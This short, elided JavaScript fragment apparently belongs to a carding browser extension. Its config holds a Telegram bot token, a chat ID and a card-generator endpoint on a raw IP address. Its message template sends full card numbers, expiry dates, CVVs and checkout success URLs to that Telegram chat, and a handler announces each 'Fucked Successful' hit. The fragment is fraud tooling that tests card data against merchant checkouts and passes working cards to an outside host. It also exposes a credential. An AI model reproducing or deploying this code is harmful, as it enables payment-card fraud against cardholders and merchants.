// Configuration
const CONFIG = {
  BOT_TOKEN: '7868269331:AAF_A3HpaNN-XLKgBscIASiwKB4Oaul7G8U',
  CARD_GENERATOR_URL: 'http://46.202.179.237:1490/bin=',
  DEBUGGER_VERSION: '1.3',
  RETRY_DELAY: 2000,
  DEFAULT_CHAT_ID: '7345260405'
};
...
<b>𝙁𝙐𝘾𝙆𝙀𝘿 𝘽𝙔 𝘿𝘼𝙉𝙂𝙀𝙍 ✅</b>  
━━━━━━━━━━━━━━━  
<b>CC :</b> <code>${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}</code>  
━━━━━━━━━━━━━━━  
<b>URL :</b> <code>${successUrl}</code>  
`;  
...
function handleSuccess(tabId, successUrl) {
  ...
  if (cardDetails) {
    ...
    sendNotificationToContent(tabId, `Fucked Successful ✅`, 'success');
